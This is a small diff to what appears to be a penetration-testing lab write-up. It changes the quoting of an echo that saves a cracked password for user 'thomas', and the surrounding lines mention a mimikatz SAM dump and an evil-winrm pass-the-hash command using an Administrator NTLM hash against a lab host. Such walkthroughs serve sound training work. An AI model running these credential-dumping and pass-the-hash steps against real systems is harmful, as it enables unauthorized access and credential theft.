@@ -208,7 +208,7 @@ lsadump::sam
 	- Save them by `vi creds.txt`
 - Then, we can just sign out of the pwnuser in the xfreerdp in 10.200.90.150 (git-serv)
 - Extract the clear-text password of thomas on https://crackstation.net/
-	- `echo thomas:i<3ruby >> creds.txt`
+	- `echo "thomas:i<3ruby" >> creds.txt`
 
 Pass-the-hash attack by evil-winrm
 - `evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.90.150`
